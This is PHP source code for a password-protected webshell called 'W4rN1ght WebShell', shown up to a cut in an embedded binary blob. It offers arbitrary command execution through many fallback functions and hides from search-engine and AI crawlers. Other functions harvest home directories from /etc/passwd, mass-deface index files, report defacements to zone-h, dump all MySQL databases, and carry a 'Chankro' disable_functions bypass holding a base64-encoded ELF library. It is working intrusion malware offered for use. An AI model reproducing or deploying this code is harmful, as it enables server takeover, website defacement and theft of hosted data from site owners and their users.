<?php
@session_start();
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('memory_limit', -1);
if(version_compare(PHP_VERSION, '5.4.0', '<')) {
    if(get_magic_quotes_gpc()) {
        function stripslashes_deep($value) {
            return is_array($value) ? array_map('stripslashes_deep', $value) : stripslashes($value);
        }
        $_GET = stripslashes_deep($_GET);
        $_POST = stripslashes_deep($_POST);
        $_COOKIE = stripslashes_deep($_COOKIE);
    }
}
if(isset($_SERVER['HTTP_USER_AGENT'])) {
    $bots = array("Googlebot", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler", "bingbot", "facebookexternalhit", "GPTBot", "ChatGPT", "ClaudeBot", "Perplexity", "Baiduspider", "Sogou");
    if(preg_match('/' . implode('|', $bots) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit("Access Denied");
    }
}
define('LOGIN_PASS', 'warnight2026');
define('COOKIE_NAME', 'w4rnight_auth');
$new_login = false;
if(!isset($_SESSION['w4rnight_logged_in'])) {
    if(isset($_COOKIE[COOKIE_NAME]) && $_COOKIE[COOKIE_NAME] == md5(LOGIN_PASS . $_SERVER['HTTP_USER_AGENT'])) {
        $_SESSION['w4rnight_logged_in'] = true;
    } elseif(isset($_POST['password']) && $_POST['password'] == LOGIN_PASS) {
        $_SESSION['w4rnight_logged_in'] = true;
        $new_login = true;
        if(isset($_POST['remember']) && $_POST['remember'] == 'on') {
            setcookie(COOKIE_NAME, md5(LOGIN_PASS . $_SERVER['HTTP_USER_AGENT']), time() + 86400 * 30, '/');
        }
    } else {
        show_login();
        exit;
    }
}
if($new_login) {
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="3;url=' . $_SERVER['PHP_SELF'] . '?action=dashboard"></head><body style="margin:0;background:#0a0a0f;display:flex;justify-content:center;align-items:center;height:100vh;width:100vw;overflow:hidden;"><img src="https://c.tenor.com/EpOrEybyM2wAAAAC/tenor.gif" style="width:100vw;height:100vh;object-fit:cover;position:fixed;top:0;left:0;z-index:9999;"></body></html>';
    exit;
}
function show_login() {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>W4rN1ght WebShell - Giriş</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
        <style>
        *{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;background-image:radial-gradient(circle at 10% 20%,rgba(106,27,154,0.2) 0%,transparent 30%),radial-gradient(circle at 90% 80%,rgba(156,39,176,0.2) 0%,transparent 30%)}.login-container{background:#12121a;border-radius:30px;padding:40px;box-shadow:0 0 60px rgba(156,39,176,0.4);border:2px solid #9c27b0;max-width:450px;width:90%;position:relative;overflow:hidden}.login-container::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent 30%,rgba(156,39,176,0.15) 50%,transparent 70%);animation:shine 8s infinite;pointer-events:none}@keyframes shine{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}.login-header{text-align:center;margin-bottom:30px}.login-header .logo{width:150px;height:150px;border-radius:50%;border:3px solid #9c27b0;margin:0 auto 20px;overflow:hidden;box-shadow:0 0 30px #9c27b0}.login-header .logo img{width:100%;height:100%;object-fit:cover}.login-header h1{color:#9c27b0;font-size:28px;text-shadow:0 0 10px #6a1b9a,0 0 20px #4a148c;letter-spacing:2px}.login-header p{color:#ce93d8;font-size:14px;margin-top:5px}.login-form input[type=password],.login-form input[type=text]{background:#1a1a24;border:2px solid #6a1b9a;border-radius:12px;padding:15px 20px;color:#fff;font-size:16px;width:100%;transition:all .3s;margin-bottom:15px}.login-form input:focus{outline:0;border-color:#9c27b0;box-shadow:0 0 20px rgba(156,39,176,.5);background:#22222f}.checkbox-wrapper{display:flex;align-items:center;color:#ce93d8;margin-bottom:20px}.checkbox-wrapper input{margin-right:10px;accent-color:#9c27b0;width:18px;height:18px}.login-form button{background:linear-gradient(45deg,#6a1b9a,#4a148c);border:0;border-radius:12px;padding:15px;color:#fff;font-size:18px;font-weight:700;cursor:pointer;width:100%;transition:all .3s;text-transform:uppercase;letter-spacing:2px;position:relative;overflow:hidden}.login-form button::after{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.2),transparent);transform:rotate(30deg);animation:btn-shine 3s infinite}.login-form button:hover{background:linear-gradient(45deg,#4a148c,#6a1b9a);box-shadow:0 0 30px rgba(156,39,176,.8)}@keyframes btn-shine{0%{transform:translateX(-100%) rotate(30deg)}100%{transform:translateX(100%) rotate(30deg)}}.login-footer{text-align:center;margin-top:25px;color:#7e57c2;font-size:12px}.login-footer i{color:#9c27b0;margin:0 5px}
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-header">
                <div class="logo"><img src="https://images2.alphacoders.com/660/thumb-1920-660058.jpg" alt="Logo"></div>
                <h1>W4rN1ght WebShell</h1>
                <p><i class="bi bi-shield-shaded"></i> Mr.Moriarty < 3 <i class="bi bi-shield-shaded"></i></p>
            </div>
            <form class="login-form" method="post">
                <input type="password" name="password" placeholder="Şifre" autofocus>
                <div class="checkbox-wrapper">
                    <input type="checkbox" name="remember" id="remember" checked>
                    <label for="remember"><i class="bi bi-lock-fill"></i> Beni Hatırla (30 gün)</label>
                </div>
                <button type="submit"><i class="bi bi-box-arrow-in-right"></i> GİRİŞ</button>
            </form>
            <div class="login-footer">
                <i class="bi bi-star-fill"></i> 2026 - WN <i class="bi bi-star-fill"></i>
            </div>
        </div>
    </body>
    </html>
    <?php
}
define('VERSION', '2026.6-ULTIMATE-FINAL');
define('SELF', $_SERVER['PHP_SELF']);

$self_url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$self_path = dirname(__FILE__);
$script_name = basename(__FILE__);
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$current_dir = str_replace('\\', '/', $current_dir);


if(substr($current_dir, -1) != '/') $current_dir .= '/';
$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN');
$path_sep = $is_windows ? '\\' : '/';
if(!$is_windows && function_exists('posix_getpwuid') && function_exists('posix_getgrgid')) {
    $user_info = posix_getpwuid(posix_geteuid());
    $group_info = posix_getgrgid(posix_getegid());
    $username = $user_info['name'];
    $groupname = $group_info['name'];
    $uid = posix_geteuid();
    $gid = posix_getegid();
} else {
    $username = get_current_user();
    $groupname = '?';
    $uid = '?';
    $gid = '?';
}
$server_software = $_SERVER['SERVER_SOFTWARE'] ?? '?';
$server_ip = gethostbyname($_SERVER['HTTP_HOST'] ?? 'localhost');
$client_ip = $_SERVER['REMOTE_ADDR'] ?? '?';
$server_admin = isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : '?';
$php_version = phpversion();
$safe_mode = ini_get('safe_mode') ? '<span class="badge-off">ON</span>' : '<span class="badge-on">OFF</span>';
$disable_functions = ini_get('disable_functions');
$open_basedir = ini_get('open_basedir');
function format_bytes($bytes, $precision = 2) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= pow(1024, $pow);
    return round($bytes, $precision) . ' ' . $units[$pow];
}
function get_perms($file) {
    if(isset($GLOBALS['is_windows']) && $GLOBALS['is_windows']) return '-rw-r--r--';
    if (!file_exists($file)) return '----------';
    $perms = fileperms($file);
    $info = '';
    $info .= (($perms & 0xC000) == 0xC000) ? 's' : ((($perms & 0xA000) == 0xA000) ? 'l' : ((($perms & 0x8000) == 0x8000) ? '-' : ((($perms & 0x6000) == 0x6000) ? 'b' : ((($perms & 0x4000) == 0x4000) ? 'd' : ((($perms & 0x2000) == 0x2000) ? 'c' : 'u')))));
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
function execute_command($cmd, $background = false) {
    $output = '';
    $methods = array();
    if($background) {
        if(!$GLOBALS['is_windows']) {
            if(function_exists('shell_exec')) {
                shell_exec($cmd . " > /dev/null 2>&1 &");
                return "Arka plan işlemi başlatıldı: " . $cmd;
            } elseif(function_exists('exec')) {
                exec($cmd . " > /dev/null 2>&1 &");
                return "Arka plan işlemi başlatıldı: " . $cmd;
            }
        } else {
            if(function_exists('shell_exec')) {
                shell_exec("start /B " . $cmd);
                return "Arka plan işlemi başlatıldı: " . $cmd;
            } elseif(function_exists('exec')) {
                exec("start /B " . $cmd);
                return "Arka plan işlemi başlatıldı: " . $cmd;
            }
        }
    }
    if(function_exists('shell_exec')) {
        $output = shell_exec($cmd . " 2>&1");
        if($output !== null) return $output;
    }
    if(function_exists('exec')) {
        exec($cmd . " 2>&1", $out_arr);
        if(!empty($out_arr)) return implode("\n", $out_arr);
    }
    if(function_exists('system')) {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_contents();
        ob_end_clean();
        if($output) return $output;
    }
    if(function_exists('passthru')) {
        ob_start();
        passthru($cmd . " 2>&1");
        $output = ob_get_contents();
        ob_end_clean();
        if($output) return $output;
    }
    if(function_exists('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        if(is_resource($handle)) {
            while(!feof($handle)) $output .= fread($handle, 1024);
            pclose($handle);
            if($output) return $output;
        }
    }
    if(function_exists('proc_open')) {
        $descriptorspec = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
        $process = proc_open($cmd, $descriptorspec, $pipes);
        if(is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($process);
            if($output) return $output;
        }
    }
    return "Command execution failed - all methods tried.";
}
function get_all_home_dirs() {
    $homes = array();
    if(file_exists('/etc/passwd')) {
        $lines = file('/etc/passwd');
        foreach($lines as $line) {
            $parts = explode(':', $line);
            if(isset($parts[5]) && (strpos($parts[5], '/home/') === 0 || strpos($parts[5], '/var/www/') === 0 || strpos($parts[5], '/usr/home/') === 0)) {
                $homes[] = $parts[5];
            }
        }
    }
    for($i = 0; $i < 10; $i++) {
        $home_path = $i == 0 ? '/home' : '/home' . $i;
        if(is_dir($home_path)) {
            $items = scandir($home_path);
            foreach($items as $item) {
                if($item != '.' && $item != '..' && is_dir($home_path . '/' . $item)) {
                    if(!in_array($home_path . '/' . $item, $homes)) $homes[] = $home_path . '/' . $item;
                }
            }
        }
    }
    $extra_dirs = array('/var/www', '/var/www/html', '/usr/local/www', '/srv/www', '/var/www/vhosts', '/usr/share/nginx/html');
    foreach($extra_dirs as $dir) {
        if(is_dir($dir)) {
            $items = scandir($dir);
            foreach($items as $item) {
                if($item != '.' && $item != '..' && is_dir($dir . '/' . $item)) {
                    if(!in_array($dir . '/' . $item, $homes)) $homes[] = $dir . '/' . $item;
                }
            }
        }
    }
    return array_unique($homes);
}
function smart_read_file($file) {
    $content = '';
    if(function_exists('file_get_contents')) {
        $content = @file_get_contents($file);
        if($content !== false) return $content;
    }
    if(function_exists('file')) {
        $lines = @file($file);
        if($lines !== false) return implode('', $lines);
    }
    if(function_exists('fopen')) {
        $fp = @fopen($file, 'rb');
        if($fp) {
            $content = '';
            while(!feof($fp)) $content .= fread($fp, 8192);
            fclose($fp);
            if($content) return $content;
        }
    }
    if(function_exists('readfile')) {
        ob_start();
        $read = @readfile($file);
        $content = ob_get_contents();
        ob_end_clean();
        if($read !== false && $content) return $content;
    }
    if(substr($file, -4) == '.php') {
        ob_start();
        @include($file);
        $content = ob_get_contents();
        ob_end_clean();
        if($content) return $content;
    }
    if(function_exists('file_get_contents')) {
        $wrappers = array(
            'php://filter/convert.base64-encode/resource=',
            'php://filter/read=string.rot13/resource=',
            'compress.zlib://'
        );
        foreach($wrappers as $wrapper) {
            $content = @file_get_contents($wrapper . $file);
            if($content) {
                if(strpos($wrapper, 'base64') !== false) $content = base64_decode($content);
                if(strpos($wrapper, 'rot13') !== false) $content = str_rot13($content);
                return $content;
            }
        }
    }
    if(function_exists('curl_init') && preg_match('/^https?:\/\//', $file)) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $file);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $content = curl_exec($ch);
        curl_close($ch);
        if($content) return $content;
    }
    $cmd_content = execute_command('cat "' . $file . '" 2>/dev/null');
    if($cmd_content && !strpos($cmd_content, 'execution failed')) return $cmd_content;
    return false;
}
function port_scan($host, $ports, $timeout = 1) {
    $open = array();
    foreach($ports as $port) {
        $connection = @fsockopen($host, $port, $errno, $errstr, $timeout);
        if(is_resource($connection)) {
            $open[] = $port;
            fclose($connection);
        }
    }
    return $open;
}
function mass_deface($dirs, $content, $pattern = 'index') {
    $defaced = array();
    $files = array('index.php', 'index.html', 'index.htm', 'default.php', 'default.html', 'home.php', 'main.php', 'wp-content/themes/index.php', 'wp-content/themes/header.php', 'wp-content/themes/footer.php');
    foreach($dirs as $dir) {
        foreach($files as $file) {
            $target = rtrim($dir, '/') . '/public_html/' . $file;
            if(file_exists($target) && is_writable($target)) {
                if(file_put_contents($target, $content)) $defaced[] = $target;
            }
            $target2 = rtrim($dir, '/') . '/' . $file;
            if(file_exists($target2) && is_writable($target2)) {
                if(file_put_contents($target2, $content)) $defaced[] = $target2;
            }
        }
        $items = @scandir($dir . '/public_html');
        if($items) {
            foreach($items as $item) {
                if($item != '.' && $item != '..' && is_dir($dir . '/public_html/' . $item)) {
                    foreach($files as $file) {
                        $target = $dir . '/public_html/' . $item . '/' . $file;
                        if(file_exists($target) && is_writable($target)) {
                            if(file_put_contents($target, $content)) $defaced[] = $target;
                        }
                    }
                }
            }
        }
    }
    return $defaced;
}
function zoneh_submit($url, $defacer = 'W4rN1ght') {
    $ch = curl_init('http://www.zone-h.org/notify/single');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=" . urlencode($defacer) . "&domain1=" . urlencode($url) . "&hackmode=1&reason=1&submit=Send");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    $result = curl_exec($ch);
    curl_close($ch);
    return strpos($result, 'OK') !== false;
}
function send_mail($from, $to, $subject, $message, $headers_extra = '') {
    $headers = "From: " . $from . "\r\n";
    $headers .= "Reply-To: " . $from . "\r\n";
    $headers .= "X-Mailer: W4rN1ght WebShell\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=UTF-8\r\n";
    $headers .= $headers_extra;
    if(function_exists('mail')) {
        return @mail($to, $subject, $message, $headers);
    }
    if(function_exists('fsockopen')) {
        $smtp_host = ini_get('SMTP');
        if($smtp_host) {
            $fp = @fsockopen($smtp_host, 25, $errno, $errstr, 5);
            if($fp) {
                fputs($fp, "HELO " . gethostname() . "\r\n");
                fputs($fp, "MAIL FROM: <" . $from . ">\r\n");
                fputs($fp, "RCPT TO: <" . $to . ">\r\n");
                fputs($fp, "DATA\r\n");
                fputs($fp, "Subject: " . $subject . "\r\n");
                fputs($fp, $headers);
                fputs($fp, "\r\n" . $message . "\r\n.\r\n");
                fputs($fp, "QUIT\r\n");
                fclose($fp);
                return true;
            }
        }
    }
    return false;
}
function install_adminer() {
    $url = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
    $target = "adminer.php";
    if(function_exists('file_put_contents') && function_exists('fopen')) {
        $content = @file_get_contents($url);
        if($content) {
            file_put_contents($target, $content);
            return true;
        }
    }
    $content = execute_command("wget -q -O $target $url 2>/dev/null || curl -s -o $target $url");
    if(file_exists($target) && filesize($target) > 1000) {
        return true;
    }
    return false;
}
function dump_database($host, $user, $pass, $dbname = '', $output_file = 'dump.sql') {
    $cmd = "";
    if(!$GLOBALS['is_windows']) {
        if($dbname) {
            $cmd = "mysqldump -h '$host' -u '$user' --password='$pass' '$dbname' > '$output_file' 2>/dev/null";
        } else {
            $cmd = "mysqldump -h '$host' -u '$user' --password='$pass' --all-databases > '$output_file' 2>/dev/null";
        }
    } else {
        if($dbname) {
            $cmd = "mysqldump -h $host -u $user --password=$pass $dbname > $output_file 2>nul";
        } else {
            $cmd = "mysqldump -h $host -u $user --password=$pass --all-databases > $output_file 2>nul";
        }
    }
    $result = execute_command($cmd);
    if(file_exists($output_file) && filesize($output_file) > 0) {
        return true;
    }
    return false;
}
function bypasshell_execute($cmd) {
    $results = array();
    $temp_file = '/tmp/bypass_' . md5(rand()) . '.txt';
    if(function_exists('mail') && function_exists('putenv') && function_exists('file_put_contents')) {
        $chankro = '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BwAAAAwAAAAAAAAAAAAAAEiD7AhIiwW9CCAASIXAdAL/0EiDxAjDAP810gggAP8l1AggAA8fQAD/JdIIIABoAAAAAOng/////yXKCCAAaAEAAADp0P////8lwgggAGgCAAAA6cD/////JboIIABoAwAAAOmw/////yWyCCAAaAQAAADpoP////8lqgggAGgFAAAA6ZD/////JaIIIABoBgAAAOmA/////yWaCCAAaAcAAADpcP////8lkgggAGgIAAAA6WD/////JSIIIABmkAAAAAAAAAAASI09gQggAEiNBYEIIABVSCn4SInlSIP4DnYVSIsF1gcgAEiFwHQJXf/gZg8fRAAAXcMPH0AAZi4PH4QAAAAAAEiNPUEIIABIjTU6CCAAVUgp/kiJ5UjB/gNIifBIweg/SAHGSNH+dBhIiwWhByAASIXAdAxd/+BmDx+EAAAAAABdww8fQABmLg8fhAAAAAAAgD3xByAAAHUnSIM9dwcgAABVSInldAxIiz3SByAA6D3////oSP///13GBcgHIAAB88MPH0AAZi4PH4QAAAAAAEiNPVkFIABIgz8AdQvpXv///2YPH0QAAEiLBRkHIABIhcB06VVIieX/0F3pQP///1VIieVIjT16AAAA6FD+//++/wEAAEiJx+iT/v//SI09YQAAAOg3/v//SInH6E/+//+QXcNVSInlvgEAAAC/AQAAAOhZ/v//6JT+//+FwHQKvwAAAADodv7//5Bdw1VIieVIjT0lAAAA6FP+///o/v3//+gZ/v//kF3DAABIg+wISIPECMNDSEFOS1JPAExEX1BSRUxPQUQAARsDOzQAAAAFAAAAuP3//1AAAABY/v//eAAAAGj///+QAAAAnP///7AAAADF////0AAAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAkAAAAHAAAAGD9//+gAAAAAA4QRg4YSg8LdwiAAD8aOyozJCIAAAAAFAAAAEQAAADY/f//CAAAAAAAAAAAAAAAHAAAAFwAAADQ/v//NAAAAABBDhCGAkMNBm8MBwgAAAAcAAAAfAAAAOT+//8pAAAAAEEOEIYCQw0GZAwHCAAAABwAAACcAAAA7f7//x0AAAAAQQ4QhgJDDQZYDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAgAAAAAAAAAAAAAAAAAAHAIAAAAAAAAAAAAAAAAAAABAAAAAAAAALsAAAAAAAAADAAAAAAAAAAYBwAAAAAAAA0AAAAAAAAAXAkAAAAAAAAZAAAAAAAAAPgNIAAAAAAAGwAAAAAAAAAQAAAAAAAAABoAAAAAAAAACA4gAAAAAAAcAAAAAAAAAAgAAAAAAAAA9f7/bwAAAADwAQAAAAAAAAUAAAAAAAAAMAQAAAAAAAAGAAAAAAAAADgCAAAAAAAACgAAAAAAAADpAAAAAAAAAAsAAAAAAAAAGAAAAAAAAAADAAAAAAAAAAAQIAAAAAAAAgAAAAAAAADYAAAAAAAAABQAAAAAAAAABwAAAAAAAAAXAAAAAAAAAEAGAAAAAAAABwAAAAAAAABoBQAAAAAAAAgAAAAAAAAA2AAAAAAAAAAJAAAAAAAAABgAAAAAAAAA/v//bwAAAABIBQAAAAAAAP///28AAAAAAQAAAAAAAADw//9vAAAAABoFAAAAAAAA+f//bwAAAAADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgOIAAAAAAAAAAAAAAAAAAAAAAAAAAAAEYHAAAAAAAAVgcAAAAAAABmBwAAAAAAAHYHAAAAAAAAhgcAAAAAAACWBwAAAAAAAKYHAAAAAAAAtgcAAAAAAADGBwAAAAAAAGAQIAAAAAAAR0NDOiAoRGViaWFuIDYuMy4wLTE4K2RlYjl1MSkgNi4zLjAgMjAxNzA1MTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAQDIAQAAAAAAAAAAAAAAAAAAAAAAAAMAAgDwAQAAAAAAAAAAAAAAAAAAAAAAAAMAAwA4AgAAAAAAAAAAAAAAAAAAAAAAAAMABAAwBAAAAAAAAAAAAAAAAAAAAAAAAAMABQAaBQAAAAAAAAAAAAAAAAAAAAAAAAMABgBIBQAAAAAAAAAAAAAAAAAAAAAAAAMABwBoBQAAAAAAAAAAAAAAAAAAAAAAAAMACABABgAAAAAAAAAAAAAAAAAAAAAAAAMACQAYBwAAAAAAAAAAAAAAAAAAAAAAAAMACgAwBwAAAAAAAAAAAAAAAAAAAAAAAAMACwDQBwAAAAAAAAAAAAAAAAAAAAAAAAMADADgBwAAAAAAAAAAAAAAAAAAAAAAAAMADQBcCQAAAAAAAAAAAAAAAAAAAAAAAAMADgBlCQAAAAAAAAAAAAAAAAAAAAAAAAMADwB4CQAAAAAAAAAAAAAAAAAAAAAAAAMAEACwCQAAAAAAAAAAAAAAAAAAAAAAAAMAEQD4DSAAAAAAAAAAAAAAAAAAAAAAAAMAEgA